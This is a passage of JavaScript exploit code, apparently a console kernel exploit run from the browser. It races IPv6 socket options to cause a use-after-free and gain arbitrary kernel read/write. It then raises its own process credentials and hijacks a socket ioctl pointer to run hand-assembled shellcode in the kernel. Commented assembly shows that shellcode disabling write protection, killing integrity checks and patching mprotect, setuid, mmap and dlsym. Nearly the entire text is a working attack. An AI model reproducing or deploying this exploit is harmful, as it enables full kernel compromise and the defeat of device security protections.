  p.write4(valid_pktopts.add32(0xC), IPV6_TCLASS);
  p.write4(valid_pktopts.add32(0x10), 0x0);

  p.write8(size_of_tclass, 0x4);
  p.write8(spray_tclass, SPRAY_TCLASS);

  p.write8(master_main_tclass, 0x0);
  p.write8(master_thr1_tclass, 0x0);
  p.write8(master_thr2_tclass, 0x0);

  p.write8(taint_tclass, TAINT_CLASS);
  p.write8(tmp_tclass, 0x10);

  p.write8(pktinfo_buffer_len, 0x14);

  //create sockets
  const master_socket = chain.syscall(97, AF_INET6, SOCK_DGRAM, IPPROTO_UDP).low;
  const target_socket = chain.syscall(97, AF_INET6, SOCK_DGRAM, IPPROTO_UDP).low;
  const spare_socket = chain.syscall(97, AF_INET6, SOCK_DGRAM, IPPROTO_UDP).low;

  const this_pid = chain.syscall(20).low;

  {

    for (var i = 0; i < NUM_SPRAY_SOCKS; i++) {
      chain.fcall(window.syscalls[97], AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
      chain.write_result4(spray_sockets_ptr.add32(0x4 * i));
    }
    for (var i = 0; i < NUM_LEAK_SOCKS; i++) {
      chain.fcall(window.syscalls[97], AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
      chain.write_result4(leak_sockets_ptr.add32(0x4 * i));
    }
    for (var i = 0; i < NUM_SLAVE_SOCKS; i++) {
      chain.fcall(window.syscalls[97], AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
      chain.write_result4(slave_sockets_ptr.add32(0x4 * i));
    }
  }
  chain.run();

  const spray_sockets = p.array_from_address(spray_sockets_ptr, NUM_SPRAY_SOCKS);
  const spray_socks_tclasses = p.array_from_address(spray_socks_tclasses_ptr, NUM_SPRAY_SOCKS);

  const leak_sockets = p.array_from_address(leak_sockets_ptr, NUM_LEAK_SOCKS);
  const slave_sockets = p.array_from_address(slave_sockets_ptr, NUM_SLAVE_SOCKS);

  const fix_me = p.array_from_address(fix_these_sockets_ptr, NUM_SPRAY_SOCKS + NUM_LEAK_SOCKS + NUM_SLAVE_SOCKS + 0x2);

  for (var i = 0; i < NUM_SPRAY_SOCKS; i++) {
    fix_me[i] = spray_sockets[i];
  }
  for (var i = 0; i < NUM_LEAK_SOCKS; i++) {
    fix_me[i + NUM_SPRAY_SOCKS] = leak_sockets[i];
  }
  for (var i = 0; i < NUM_SLAVE_SOCKS; i++) {
    fix_me[i + (NUM_SPRAY_SOCKS + NUM_LEAK_SOCKS)] = slave_sockets[i];
  }

  fix_me[NUM_SPRAY_SOCKS + NUM_LEAK_SOCKS + NUM_SLAVE_SOCKS + 0x0] = master_socket;
  fix_me[NUM_SPRAY_SOCKS + NUM_LEAK_SOCKS + NUM_SLAVE_SOCKS + 0x1] = spare_socket;

  for (var i = 0; i < 10; i++) {
    p.write8(fake_socketops.add32(i * 0x8), window.gadgets["ret"]);
  }
  p.write8(fake_socketops.add32(0x50), 1);

  var thr1_start;
  var thr1_ctrl;
  const thread1 = chain.spawn_thread("thread1", function (new_thr) {
    const loop_start = new_thr.get_rsp();
    const trigger_condition = new_thr.create_equal_branch(triggered, 1);

    const triggered_false = new_thr.get_rsp();
    new_thr.syscall_safe(118, master_socket, IPPROTO_IPV6, IPV6_TCLASS, master_thr1_tclass, size_of_tclass);
    const overlap_condition = new_thr.create_equal_branch(master_thr1_tclass, SPRAY_TCLASS);

    const overlap_false = new_thr.get_rsp();
    new_thr.syscall_safe(105, master_socket, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, valid_pktopts, size_of_valid_pktopts);
    new_thr.push(window.gadgets["pop rdi"]);
    var dest_idx = new_thr.pushSymbolic();
    new_thr.push(window.gadgets["pop rsi"]);
    var src_idx = new_thr.pushSymbolic();
    new_thr.push(window.gadgets["mov [rdi], rsi"]);
    var l1 = new_thr.get_rsp();
    new_thr.push(window.gadgets["pop rsp"]);
    var l2 = new_thr.get_rsp();
    new_thr.push(0x43434343);

    new_thr.finalizeSymbolic(dest_idx, l2);
    new_thr.finalizeSymbolic(src_idx, l1);
    thr1_start = loop_start;
    thr1_ctrl = l2;

    const overlap_true = new_thr.get_rsp();
    new_thr.push_write8(triggered, 1);

    const triggered_true = new_thr.get_rsp();
    new_thr.fcall(libKernelBase.add32(OFFSET_lk_pthread_exit), 0);

    new_thr.set_branch_points(trigger_condition, triggered_true, triggered_false);
    new_thr.set_branch_points(overlap_condition, overlap_true, overlap_false);
  });

  //boys dont race too fast now, kthx.
  var me = chain.call(libKernelBase.add32(OFFSET_lk_pthread_self));
  var prio = p.malloc(0x8);
  p.write4(prio, 0x100);
  var r = chain.call(libKernelBase.add32(OFFSET_lk_pthread_setschedparam), me, 1, prio);

  const thread3 = new rop(); {
    //main loop
    const loop_start = thread3.get_rsp();
    //set valid.
    thread3.syscall_safe(105, master_socket, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, valid_pktopts, size_of_valid_pktopts);
    //make thr1 give it a go
    thread3.push_write8(thr1_ctrl, thr1_start);
    thread3.syscall_safe(118, master_socket, IPPROTO_IPV6, IPV6_TCLASS, master_thr2_tclass, size_of_tclass);
    thread3.syscall_safe(105, master_socket, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
    for (var i = 0; i < NUM_SPRAY_SOCKS; i++) {
      thread3.syscall_safe(105, spray_sockets[i], IPPROTO_IPV6, IPV6_TCLASS, spray_tclass, 4);
    }
    thread3.syscall_safe(118, master_socket, IPPROTO_IPV6, IPV6_TCLASS, master_main_tclass, size_of_tclass);
    const overlap_condition = thread3.create_equal_branch(master_main_tclass, SPRAY_TCLASS);
    const overlap_false = thread3.get_rsp();
    for (var i = 0; i < NUM_SPRAY_SOCKS; i++) {
      thread3.syscall_safe(105, spray_sockets[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
    }
    thread3.jmp_rsp(loop_start);
    const overlap_true = thread3.get_rsp();
    thread3.push_write8(triggered, 1);
    thread3.fcall(syscalls[105], master_socket, IPPROTO_IPV6, IPV6_TCLASS, taint_tclass, 4);
    for (var i = 0; i < NUM_SPRAY_SOCKS; i++) {
      thread3.fcall(syscalls[118], spray_sockets[i], IPPROTO_IPV6, IPV6_TCLASS, spray_socks_tclasses_ptr.add32(0x4 * i), size_of_tclass);
    }
    //make sure the thread will exit(?)
    thread3.push_write8(thr1_ctrl, thr1_start);
    thread3.set_branch_points(overlap_condition, overlap_true, overlap_false);
  }
  //trigger uaf
  thread1();
  thread3.run();

  function find_socket_overlap() {
    for (var i = 0; i < NUM_SPRAY_SOCKS; i++) {
      if (spray_socks_tclasses[i] == TAINT_CLASS) {
        overlapped_socket = spray_sockets[i];
        overlapped_socket_idx = i;
        return;
      }
    }
    alert("[ERROR] -> failed to find socket overlap. (should be unreachable)");
    while (1) {};
  }

  function fake_pktopts(pktinfo) {
    {

      chain.fcall(libSceLibcInternalBase.add32(OFFSET_libcint_memset), rthdr_buffer, 0x0, 0x100);
      chain.push_write8(rthdr_buffer.add32(0x0), 0x0F001E00);
      chain.push_write8(rthdr_buffer.add32(PKTOPTS_PKTINFO_OFFSET), pktinfo);
      chain.push_write8(loop_counter, 0);
      chain.push_write8(tmp_tclass, 0x1);
      for (var i = 0; i < NUM_LEAK_SOCKS; i++) {
        chain.fcall(syscalls[105], leak_sockets[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
        chain.fcall(syscalls[105], leak_sockets[i], IPPROTO_IPV6, IPV6_TCLASS, tmp_tclass, 4);
      }
      chain.fcall(window.syscalls[105], overlapped_socket, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);

      const loop_start = chain.get_rsp();
      const loop_condition = chain.create_equal_branch(loop_counter, 0x100);

      const loop_condition_false = chain.get_rsp();
      for (var i = 0; i < NUM_LEAK_SOCKS; i++) {
        chain.push_write8(rthdr_buffer.add32(PKTOPTS_TCLASS_OFFSET), (TCLASS_MASTER | i));
        chain.syscall_safe(105, leak_sockets[i], IPPROTO_IPV6, IPV6_RTHDR, rthdr_buffer, 0xF8);
      }
      chain.syscall_safe(118, master_socket, IPPROTO_IPV6, IPV6_TCLASS, tmp_tclass, size_of_tclass);
      const overlap_condition = chain.create_greater_or_equal_branch(tmp_tclass, TCLASS_MASTER);

      const overlap_false = chain.get_rsp();
      chain.push(window.gadgets["pop rax"]);
      chain.push(loop_counter);
      chain.push(window.gadgets["inc dword [rax]"]);
      chain.jmp_rsp(loop_start);

      const loop_condition_true = chain.get_rsp();
      const overlap_true = chain.get_rsp();

      chain.set_branch_points(loop_condition, loop_condition_true, loop_condition_false);
      chain.set_branch_points(overlap_condition, overlap_true, overlap_false);
    }
    chain.run();

    const tclass = p.read4(tmp_tclass);
    if ((tclass & 0xFFFF0000) == TCLASS_MASTER) {
      overlapped_socket_idx = (tclass & 0x0000FFFF);
      overlapped_socket = leak_sockets[overlapped_socket_idx];
      return;
    }
    alert("[ERROR] failed to find RTHDR <-> master socket overlap");
    while (1) {};

  }

  function leak_rthdr_address(size) {
    const ip6r_len = ((size >> 3) - 1 & ~1);
    const ip6r_segleft = (ip6r_len >> 1);
    const header = (ip6r_len << 8) + (ip6r_segleft << 24); {
      chain.fcall(libSceLibcInternalBase.add32(OFFSET_libcint_memset), rthdr_buffer, 0x0, size);
      chain.push_write8(rthdr_buffer, header);
      chain.push_write8(ptr_size_of_rthdr_buffer, size);
      chain.fcall(syscalls[105], master_socket, IPPROTO_IPV6, IPV6_RTHDR, rthdr_buffer, ((ip6r_len + 1) << 3));
      chain.fcall(syscalls[118], overlapped_socket, IPPROTO_IPV6, IPV6_RTHDR, rthdr_buffer, ptr_size_of_rthdr_buffer);
    }
    chain.run();
    const kaddress = p.read8(rthdr_buffer.add32(PKTOPTS_RTHDR_OFFSET));
    return kaddress;
  }

  function leak_pktopts() {
    leaked_pktopts_address = leak_rthdr_address(0x100); {
      chain.push_write8(tmp_tclass, 0x10);
      chain.fcall(syscalls[105], master_socket, IPPROTO_IPV6, IPV6_RTHDR, 0, 0);
      for (var i = 0; i < NUM_SLAVE_SOCKS; i++) {
        chain.fcall(syscalls[105], slave_sockets[i], IPPROTO_IPV6, IPV6_TCLASS, tmp_tclass, 4);
      }
    }
    chain.run();
  }

  function find_slave() {
    {
      chain.push_write8(pktinfo_buffer, leaked_pktopts_address.add32(PKTOPTS_PKTINFO_OFFSET));
      chain.push_write8(pktinfo_buffer.add32(0x8), 0);
      chain.push_write8(pktinfo_buffer.add32(0x10), 0);
      chain.fcall(syscalls[105], master_socket, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_buffer, 0x14);
      for (var i = 0; i < NUM_SLAVE_SOCKS; i++) {
        chain.fcall(syscalls[118], slave_sockets[i], IPPROTO_IPV6, IPV6_PKTINFO, find_slave_buffer.add32(0x8 * i), pktinfo_buffer_len);
      }
    }
    chain.run();

    for (var i = 0; i < NUM_SLAVE_SOCKS; i++) {
      if (p.read4(find_slave_buffer.add32(0x8 * i)) == (leaked_pktopts_address.add32(PKTOPTS_PKTINFO_OFFSET)).low) {
        slave_socket = slave_sockets[i];
        return;
      }
    }
    alert("[ERROR] failed to find slave");
    while (1) {};
  }

  function kernel_read8(address) {
    {
      chain.push_write8(pktinfo_buffer, address);
      chain.push_write8(pktinfo_buffer.add32(0x8), 0);
      chain.push_write8(pktinfo_buffer.add32(0x10), 0);
      chain.fcall(syscalls[105], master_socket, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_buffer, 0x14);
      chain.fcall(syscalls[118], slave_socket, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_buffer, pktinfo_buffer_len)
    }
    chain.run();
    return p.read8(pktinfo_buffer);
  }

  function kernel_write8(address, value) {
    {
      chain.push_write8(pktinfo_buffer, address);
      chain.push_write8(pktinfo_buffer.add32(0x8), 0);
      chain.push_write8(pktinfo_buffer.add32(0x10), 0);
      chain.fcall(syscalls[105], master_socket, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_buffer, 0x14);
      chain.fcall(syscalls[118], slave_socket, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_buffer, pktinfo_buffer_len);
      chain.push_write8(pktinfo_buffer, value);
      chain.fcall(syscalls[105], slave_socket, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_buffer, 0x14);
    }
    chain.run();
  }

  function brute_force_kernel_map() {
    var attempt = new int64(((leaked_pktopts_address.low & 0xFE000000) + VM_MAP_PMAP_OFFSET), leaked_pktopts_address.hi);
    for (var i = 0; i < 0xC0; i++) {
      var kernel_pmap_store = kernel_read8(attempt);
      if (kernel_pmap_store.hi == 0xFFFFFFFF && ((kernel_pmap_store.low & 0x3FFF) == (KERNEL_PMAP_STORE_OFFSET & 0x3FFF))) {
        kernel_base = kernel_pmap_store.sub32(KERNEL_PMAP_STORE_OFFSET);
        if ((kernel_base.low & 0x3FFF) == 0x0) {
          return;
        }
      }
      attempt.sub32inplace(0x01000000);
    }
    alert("[ERROR] failed to find kernel_map");
    while (1) {};
  }

  function find_proc() {
    var proc = kernel_read8(kernel_base.add32(KERNEL_ALLPROC_OFFSET));
    while (proc.low != 0) {
      var pid = kernel_read8(proc.add32(PROC_PID_OFFSET));
      if (pid.low == this_pid) {
        return proc;
      }
      proc = kernel_read8(proc);
    }
    alert("[ERROR] failed to find proc");
    while (1) {};
  }

  function find_execution_socket() {

    var filedesc = kernel_read8(proc.add32(PROC_FILEDESC_OFFSET));
    var ofiles = kernel_read8(filedesc);
    target_file = kernel_read8(ofiles.add32(0x8 * target_socket))
    socketops = kernel_read8(target_file.add32(FILE_FOPS_OFFSET));
  }
  //lower priority
  p.write4(prio, 0x1FF);
  chain.call(libKernelBase.add32(OFFSET_lk_pthread_setschedparam), me, 1, prio);
  //find uaf
  find_socket_overlap();
  //play with uaf
  fake_pktopts(0);
  leak_sockets[overlapped_socket_idx] = spare_socket;
  //leak shit
  leak_pktopts();
  fake_pktopts(leaked_pktopts_address.add32(PKTOPTS_PKTINFO_OFFSET));
  //find vvictim
  find_slave();
  brute_force_kernel_map();
  const proc = find_proc();
  const proc_ucred = kernel_read8(proc.add32(PROC_UCRED_OFFSET));
  kernel_write8(proc_ucred.add32(0x68), new int64(0xFFFFFFFF, 0xFFFFFFFF));

  find_execution_socket();
  var exec_handle = chain.syscall(533, 0, 0x100000, 7);
  var write_handle = chain.syscall(534, exec_handle, 3);
  var write_address = chain.syscall(477, new int64(0x91000000, 0x9), 0x100000, 3, 17, write_handle, 0);
  var exec_address = chain.syscall(477, new int64(0x90000000, 0x9), 0x100000, 0x5, 1, exec_handle, 0)
  chain.syscall(324, 1);
  if(exec_address.low != 0x90000000) {
      alert("[ERROR] failed to allocate jit memory");
      while(1){};
  }
  var exec_writer = p.array_from_address(write_address, 0x4000);
  for(var i = 0; i < 0x200; i++) {
      exec_writer[i] = 0x90909090;
  }
  exec_writer[0x200] = 0x37C0C748;
  exec_writer[0x201] = 0xC3000013;
  if(chain.call(exec_address).low != 0x1337) {
      alert("[ERROR] hmm weird");
      while(1){};
  }

  exec_writer[0] = 0x54415355;
  exec_writer[1] = 0x1111BB48;
  exec_writer[2] = 0x11111111;
  exec_writer[3] = 0xBD481111;
  exec_writer[4] = 0x22222222;
  exec_writer[5] = 0x22222222;
  exec_writer[6] = 0xBFE4314D;
  exec_writer[7] = 0x000000C0;
  exec_writer[8] = 0xBADE8948;
  exec_writer[9] = 0x00000002;
  exec_writer[10] = 0x8349D5FF;
  exec_writer[11] = 0x814901C4;
  exec_writer[12] = 0x000500FC;
  exec_writer[13] = 0x41E47500;
  exec_writer[14] = 0x655D5B5C;
  exec_writer[15] = 0x25048B48;
  exec_writer[16] = 0x00000000;
  exec_writer[17] = 0x08408B48;
  exec_writer[18] = 0x48408B48;
  exec_writer[19] = 0x48008B48;
  exec_writer[20] = 0x333333B9;
  exec_writer[21] = 0x33333333;
  exec_writer[22] = 0xC7C74833;
  exec_writer[23] = 0x000002BE; // num sockets
  exec_writer[24] = 0x48F63148;
  exec_writer[25] = 0x117DFE39;
  exec_writer[26] = 0x48B1148B;
  exec_writer[27] = 0x00D004C7;
  exec_writer[28] = 0x48000000;
  exec_writer[29] = 0xEB01C683;
  exec_writer[30] = 0x44BF48EA;
  exec_writer[31] = 0x44444444;
  exec_writer[32] = 0x48444444;
  exec_writer[33] = 0x555555BE;
  exec_writer[34] = 0x55555555;
  exec_writer[35] = 0x37894855;
  exec_writer[36] = 0x6666BF48;
  exec_writer[37] = 0x66666666;
  exec_writer[38] = 0x200F6666;
  exec_writer[39] = 0xFF2548C0;
  exec_writer[40] = 0x0FFFFEFF;
  exec_writer[41] = 0x87C6C022;
  exec_writer[42] = 0x0063A160;
  exec_writer[43] = 0xC087C7C3;
  exec_writer[44] = 0x480063AC;
  exec_writer[45] = 0xC7C3C031;
  exec_writer[46] = 0x639F1087;
  exec_writer[47] = 0xC0314800;
  exec_writer[48] = 0xE087C7C3;
  exec_writer[49] = 0x480063A6;
  exec_writer[50] = 0xC6C3C031;
  exec_writer[51] = 0x67B5C087;
  exec_writer[52] = 0xBE480002;
  exec_writer[53] = 0x90909090;
  exec_writer[54] = 0x8B499090;
  exec_writer[55] = 0x08B78948;
  exec_writer[56] = 0xC700264C;
  exec_writer[57] = 0x087B7087;
  exec_writer[58] = 0x0000B800;
  exec_writer[59] = 0x9087C700;
  exec_writer[60] = 0x00000004;
  exec_writer[61] = 0x66000000;
  exec_writer[62] = 0x04B987C7;
  exec_writer[63] = 0x90900000;
  exec_writer[64] = 0xBD87C766;
  exec_writer[65] = 0x90000004;
  exec_writer[66] = 0x87C76690;
  exec_writer[67] = 0x000004C6;
  exec_writer[68] = 0x87C6E990;
  exec_writer[69] = 0x001D2336;
  exec_writer[70] = 0x3987C637;
  exec_writer[71] = 0x37001D23;
  exec_writer[72] = 0xC187C766;
  exec_writer[73] = 0x9000094E;
  exec_writer[74] = 0x87C766E9;
  exec_writer[75] = 0x0009547B;
  exec_writer[76] = 0x87C7E990;
  exec_writer[77] = 0x002F2C20;
  exec_writer[78] = 0xC3C03148;
  exec_writer[79] = 0x7087C748;
  exec_writer[80] = 0x02011258;
  exec_writer[81] = 0x48000000;
  exec_writer[82] = 0xB192B78D;
  exec_writer[83] = 0x89480006;
  exec_writer[84] = 0x125878B7;
  exec_writer[85] = 0x9C87C701;
  exec_writer[86] = 0x01011258;
  exec_writer[87] = 0x48000000;
  exec_writer[88] = 0x0100000D;
  exec_writer[89] = 0xC0220F00;
  exec_writer[90] = 0x8080B848;
  exec_writer[91] = 0x80808080;
  exec_writer[92] = 0x90C38080;

  p.write8(write_address.add32(0x6), kernel_base.add32(KERNEL_M_IP6OPT_OFFSET));
  p.write8(write_address.add32(0x10), kernel_base.add32(KERNEL_MALLOC_OFFSET));
  p.write8(write_address.add32(0x51), fix_these_sockets_ptr);

  p.write8(write_address.add32(0x7B), target_file.add32(FILE_FOPS_OFFSET));
  p.write8(write_address.add32(0x85), socketops);
  p.write8(write_address.add32(0x92), kernel_base);

  p.write8(fake_socketops.add32(FILEOPS_IOCTL_OFFSET), exec_address);
  kernel_write8(target_file.add32(FILE_FOPS_OFFSET), fake_socketops);
  chain.syscall(54, target_socket, 0x20001111, 0);
  //alert("executed in kernel");
  //p.write8(0, 0);
}
/*
    - assemble & take every 4 bytes, byteswap and assign them to exec_writer
    - overwrite dynamic stuff after
*/
/*
//spam malloc, this should not be required anymore
push rbp
push rbx
push r12  

mov rbx, 0x1111111111111111
mov rbp, 0x2222222222222222
xor r12, r12

kmalloc_loop:
	mov edi, 0xC0
  mov rsi, rbx
	mov edx, 2
  call rbp
	add r12, 0x1
  cmp r12, 0x500
  jne kmalloc_loop

pop r12
pop rbx
pop rbp

//kill all of our socket file*'s just in case
//get thr pointer
mov rax, qword ptr gs:[0x0]
//get proc pointer
mov rax, qword ptr [rax + 0x8]
//get filedesc pointer
mov rax, qword ptr [rax + 0x48]
//get file pointer pointer
mov rax, qword ptr [rax + 0x0]

mov rcx, 0x3333333333333333
mov rdi, 0x2BE
xor rsi, rsi
loop_check:
  cmp rsi, rdi
  jge end
  mov edx, dword ptr [rcx + 0x4 * rsi]
  mov qword ptr [rax + rdx * 0x8], 0x0
  add rsi, 0x1
  jmp loop_check

end:

//socketops field pointer
mov rdi, 0x4444444444444444
//original socketops pointer
mov rsi, 0x5555555555555555 
mov qword ptr [rdi], rsi
//kernel base
mov rdi, 0x6666666666666666 

//disable wp
mov rax, cr0
and rax, 0xFFFFFFFFFFFEFFFF
mov cr0, rax

//sysveri just die
mov byte ptr [rdi + 0x63a160], 0xC3
mov dword ptr [rdi + 0x63acc0], 0xC3C03148
mov dword ptr [rdi + 0x639f10], 0xC3C03148
mov dword ptr [rdi + 0x63a6e0], 0xC3C03148
mov byte ptr [rdi + 0x267b5c0], 0x00

//mprotect
mov rsi, 0x8B49909090909090
mov qword ptr [rdi + 0x264C08], rsi

//setuid
mov dword ptr [rdi + 0x87B70], 0xB8

//syscall everywhere
mov dword ptr [rdi + 0x490], 0x0
mov word ptr [rdi + 0x4B9], 0x9090
mov word ptr [rdi + 0x4BD], 0x9090
mov word ptr [rdi + 0x4C6], 0xE990

//rwx mmap
mov byte ptr [rdi + 0x1D2336], 0x37
mov byte ptr [rdi + 0x1D2339], 0x37

//patch load prx
mov word ptr [rdi + 0x94EC1], 0xE990

//dlsym
mov word ptr [rdi + 0x9547B], 0xE990
mov dword ptr [rdi + 0x2F2C20], 0xC3C03148

//syscall 11
mov qword ptr [rdi + 0x1125870], 0x2
lea rsi, [rdi + 0x6B192]
mov qword ptr [rdi + 0x1125878], rsi
mov dword ptr [rdi + 0x112589C], 0x1

//enable wp
or rax, 0x10000
mov cr0, rax
mov rax, 0x8080808080808080
ret
*/


//rdi
//rsi
//rdx
//rcx
//r8
//r9